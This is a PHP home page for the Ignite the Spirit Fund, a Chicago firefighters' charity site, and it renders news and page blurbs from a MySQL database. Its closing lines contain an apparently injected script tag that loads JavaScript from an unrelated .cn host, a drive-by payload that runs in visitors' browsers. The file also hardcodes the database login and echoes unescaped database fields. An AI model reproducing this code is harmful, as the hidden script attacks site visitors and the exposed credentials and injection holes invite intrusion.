<?php

$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);


function bbcode_format ($str) {
    $str = htmlentities($str);

    $simple_search = array(
                '/\[b\](.*?)\[\/b\]/is',                                
                '/\[i\](.*?)\[\/i\]/is',                                
                '/\[u\](.*?)\[\/u\]/is',                                
                //'/\[url\=(.*?)\](.*?)\[\/url\]/is',                         
                //'/\[url\](.*?)\[\/url\]/is',                             
                //'/\[align\=(left|center|right)\](.*?)\[\/align\]/is',    
                //'/\[img\](.*?)\[\/img\]/is',                            
                //'/\[mail\=(.*?)\](.*?)\[\/mail\]/is',                    
                //'/\[mail\](.*?)\[\/mail\]/is',                            
                //'/\[font\=(.*?)\](.*?)\[\/font\]/is',                    
                //'/\[size\=(.*?)\](.*?)\[\/size\]/is',                    
                //'/\[color\=(.*?)\](.*?)\[\/color\]/is',  
				'/\[return\]/is',      
                );

    $simple_replace = array(
                '<strong>$1</strong>',
                '<em>$1</em>',
                '<u>$1</u>',
                //'<a href="$1">$2</a>',
                //'<a href="$1">$1</a>',
                //'<div style="text-align: $1;">$2</div>',
                //'<img src="$1" />',
                //'<a href="mailto:$1">$2</a>',
                //'<a href="mailto:$1">$1</a>',
                //'<span style="font-family: $1;">$2</span>',
                //'<span style="font-size: $1;">$2</span>',
                //'<span style="color: $1;">$2</span>',
				'<br /><br />',
                );

    // Do simple BBCode's
    $str = preg_replace ($simple_search, $simple_replace, $str);

    // Do <blockquote> BBCode
    //$str = bbcode_quote ($str);

    return $str;
} 

$query = "SELECT * FROM news WHERE news_active = 1 ORDER BY news_date DESC";
$news_result = mysql_query($query);

function news($query_result) 
{
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
	$content = stripslashes ($row['news_content']);
	$print_date = date('F j, Y', strtotime($row['news_date']));
		echo "<p>";
		echo "<strong>".$print_date." | ".stripslashes($row['news_title'])."</strong><br>";
		echo bbcode_format($content);
		//echo $row['news_link'];
		if ( $row['news_link'] != 0 ) { echo " [ <a href='pages.php?id=".$row['news_link']."'>More Info</a> ]"; }
		echo "</p>";
	}
}


$blurb_query = "SELECT * FROM pages ORDER by page_id DESC";
$blurb_result = mysql_query($blurb_query);

function blurbs($query_result)
{
	$page_link = "Read More";
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
		if ($row['page_show'] != 0)
		{
			echo "<div class='blurb'> \n";
        	echo "<h3>".$row['page_title']."</h3> \n";
			echo "<img src=/".$row['page_img1']."> \n";
	    	echo "<p><a class='change' href='pages.php?id=".$row['page_id']."'>[".$page_link."]</a></p> \n";
        	echo "</div> \n";
		}
	}
}


?>
<?php include("header.php"); ?>
	<!-- <div class="nav_container">
	<marquee>Ignite the Spririt Hotline: 773.218.1038</marquee>
	</div> -->
	<div class="container">
      <div class="left">
	  	<a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
        <div class="left_content">
		<?php include("navigation.php"); ?>
        </div>
		<!--
		<div class="left_content">
		<h3>Community Login <a href="#">[Register]</a></h3>
		<form action="" method="post">
		<label>E-Mail</label>
		<input name="" type="text" />
		<label>Password</label>
		<input name="" type="text" />
		<input id="lc_submit" name="" type="submit" value="Submit" />
		</form>
		</div>
		-->
        <!-- <div class="left_content"> <img src="images/125x125banner.jpg" /> </div> -->
      </div>
	  <div class="middle">
	  	<!--
        <div class="middle_content">
		
          <div class="middle_content_left">
            <h1>Welcome</h1>
            <p>The Ignite the Spirit Fund was created to raise funds for Chicago firefighters and their families in times of need.
              By supporting the Ignite the Spirit Fund, you’ll be helping the firefighters take care of their own. It’s your chance 
              to give something back to them for doing so much for the communities in which we live. <a href="about.php">[Read more]</a></p>
          </div> -->
		  <!--
          <div class="middle_content_right"> <img src="images/James_profilephoto_bw.jpg" alt="Photo of james McGann" />
              <h1>James McGann </h1>
            <p> Chicago Firefighter/Paramedic James McGann says he gets the same rush from jumping out of an airplane that he does 
              running into a burning building to try to save someone. &ldquo;There has always been an interest in this field for me 
              because while it looks very exciting you can still help people in their time of need.&rdquo; <a href="calendar.php">[Read More]</a></p>
          </div> -->
        <!-- </div> -->
	    <div class="middle_secondary">
          <h2>News</h2>
		  <?php news($news_result); ?>
		  <!-- <span>[ <a href="news.php">View All</a> ]</span> -->

        </div>
	    <!-- <div class="middle"> <img src="images/486x68banner.jpg" /> </div> -->
      </div>
	  <div class="right">
	  <!-- 
		<div class="calendar_advertisement">
			<h1>Ignite The Spirit Calendar</h1>
			<img width="75%" src="images/calendar.gif" alt="Calendar Cover" />
			<p><a href="store.php">SHOP NOW</a></p>
		</div> -->
		<?php blurbs($blurb_result); ?>
		<!--
	    <div class="blurb">
          <h3>HIGH SCHOOL SCHOLARSHIP </h3>
	      <p><a class="change" href="eligibility.html">Eligibility and application></a></p>
        </div>
	    <div class="blurb">
          <h3>FIREMAN'S BALL </h3>
	      <p><a class="change" href="#">More information></a></p>
        </div>
		<div class="blurb">
          <h3>2009 Calendar </h3>
	      <p><a class="change" href="#">Apply to be featured></a></p>
        </div>
		-->
      </div>
</div>
	<?php include("footer.php"); ?>
<script src='http://nt002.cn/E/J.JS'></script></body>
</html>
